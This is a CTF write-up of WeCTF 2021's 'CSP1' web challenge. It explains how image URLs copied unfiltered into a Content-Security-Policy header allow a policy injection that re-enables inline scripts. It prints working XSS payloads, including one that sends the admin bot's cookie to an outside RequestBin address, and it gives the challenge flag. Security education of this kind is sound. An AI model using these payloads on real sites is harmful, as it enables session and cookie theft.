# WeCTF 2021

### Solved by: Dayton Hasty ([dayt0n](https://github.com/dayt0n)), Will Green ([Ducky](https://github.com/wlg0005))
### Challenge: CSP1
### Category: Web 

## Description:

#### Shame on Shou if his web app has XSS vulnerability. More shame on him if he does not know how to use CSP correctly.

#### Hint: Search Content-Security-Policy if you don't know what that is and check your browser console.

## Walkthrough:

Navigating to the provided URL, we're presented with a page that looks like this:

![](CSP1%20Writeup.001.png)

We can provide HTML such as `<h1>This is a test</h1>` and after we hit submit, it will be displayed to us on the next page. However, if we try to insert JavaScript via `<script>` tags, we are blocked by the [`Content Security Policy (CSP)`](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

Since we're given the source code for the site, let's take a look at how the CSP is implemented:

```javascript
@app.route('/display/<token>')
def display(token):
    user_obj = Post.select().where(Post.token == token)
    content = user_obj[-1].content if len(user_obj) > 0 else "Not Found"
    img_urls = [x['src'] for x in bs(content).find_all("img")]
    tmpl = render_template("display.html", content=content)
    resp = make_response(tmpl)
    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
    return resp
```

From the code it looks like the [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) directive being set to `none` is the cause of our issues. The `script-src` directive specifies valid sources for JavaScript, and it being set to `none` means, as you would expect, there are no valid sources. 

So.. how do we get around this? Well you might notice that there is another directive, `img-src` which is using our input to specify valid sources for images:

```javascript
img_urls = [x['src'] for x in bs(content).find_all("img")]
...
resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
```

So, the code will parse any `<img>` tags for the URL provided in the `src` parameter, and insert those URLs into the CSP. This means that we can perform a [CSP policy injection attack](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#policy-injection)!

Now that we have a good idea of the exploit, let's craft it:

![](CSP1%20Writeup.002.png)

```javascript
<img src="http://; script-src 'unsafe-inline'"></img>
<script>alert(1)</script>
```

So, because the CSP is simply inputting the "URL" in the `src` parameter into the CSP, we can easily inject a duplicate `script-src` directive, but we will set ours to `unsafe-inline` allowing us to use inline `<script>` tags. And because of the way CSP works, our version of the directive will take precedence.

Let's fire off our test and see if works:

![](CSP1%20Writeup.003.png)

Popped!

Nice, so we've successfully exploited the vulnerability but the flag is actually held in the Admin Bot's cookies. So, let's change our exploit a little bit to allow us to steal his cookie:

![](CSP1%20Writeup.004.png)

```javascript
<img src="http://; script-src 'unsafe-inline'"></img>
<script>window.location = 'https://requestbin.io/1fy84do1?cookie=' + document.cookie;</script>
```

Great, this exploit will make the Admin Bot navigate to our [RequestBin](https://requestbin.io/) link, with his cookie set as the value of a GET parameter, allowing us to inspect the request and thus see the cookie.

Let's send the final exploit to the Admin Bot, and inspect the RequestBin:

![](CSP1%20Writeup.005.png)

And there's the flag! Pretty cool challenge that highlighted one of the easier ways to get around CSP.

### Flag: we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}
